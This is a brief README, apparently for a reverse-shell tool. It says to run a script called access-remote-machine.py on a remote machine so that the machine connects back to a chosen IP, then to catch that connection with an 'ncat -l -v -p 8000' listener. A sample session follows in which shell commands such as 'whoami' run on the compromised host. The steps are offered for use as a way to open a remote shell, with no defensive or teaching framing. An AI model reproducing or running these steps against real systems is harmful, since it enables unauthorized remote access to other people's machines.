
Step 1: 
By running this on remote machine, it gives grants access to remote-ip mentioned in `access-remote-machine.py`
```
python access-remote-machine.py
```

Step 2: 
Install `ncat` if not installed on the machine

```
ncat -l -v -p 8000 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:32788.
whoami
node
whereis cat 
cat: /bin/cat /usr/share/man/man1/cat.1.gz
```
